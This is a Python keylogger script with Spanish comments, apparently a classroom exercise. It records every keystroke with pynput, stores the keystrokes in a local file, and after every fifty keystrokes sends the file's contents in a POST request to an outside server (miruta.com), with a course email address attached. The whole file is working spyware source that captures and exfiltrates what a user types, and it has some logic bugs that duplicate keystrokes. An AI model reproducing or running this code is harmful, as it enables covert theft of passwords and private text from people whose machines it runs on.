from pynput.keyboard import Key, Listener
# Creamos una lista que almacene todas las pulsaciones
import requests

keys = []

# Creamos una variable que nos servirá para controlar el largo de nuestra cadena de texto
count = 0
# Creamos una función que cree un archivo donde queden almacenadas esas pulsaciones


#creamos una variable para el contador de email
count_email = 0

#creamos una función que nos ayuda a leer el archivo de la función
def reaed_file():
  mensaje = ""
  
  #creamos un metodo que leer el archivo salida.txt y lo manda a nuestro coreo 
  with open("salida.txt", "r") as file:
    
    #content tendra todas la informacion de nuestro archivo txt
    content  = file.readlines()
    
    
    for palabra in content:
      mensaje += palabra
      
   #al final del for retornamos el mensaje   
  return mensaje

def write_file(keys):
  with open("salida.txt", "a") as file:
    for key in keys:
      j = str(key).replace("'","")
      # Si la palabra "space" está dentro de nuestra lista entonces 
      #damos un salto de linea
      if "space" in j:
        file.write('\n')

      # Si no encontramos la palabra "Key" en nuestro elemento, 
      # lo guardamos en nuestro archivo
      elif j.find("key") == -1:
        file.write(j)
def  on_press(key):
    global keys, count, count_email
    keys.append(key)
    print(f"se presiono la tecla{key}" )
    
    count += 1
    count_email += 1
         
    if count >= 5 :
      count = 0 
      write_file(keys)
    
    if count_email >= 50:
      #creamos un diccionario para enviar la informacion 
      informacion_a_enviar = {
       'correo': 'jorge2311034@hybridge.education',
       'mensaje': reaed_file()
      }
      
      res = requests.post('http://miruta.com/enviar', json=informacion_a_enviar)
      
      
      
def on_release (key):
  if key == Key.esc:
     return False
 # Creamos un método que aprovecha las dos funcunciones que 
# hicimos y los renombramos 'listener'

with Listener(on_press=on_press, on_release=on_release) as listener:
  # Le indicamos al método que todas las pulsaciones las va a detectar
  listener.join()
   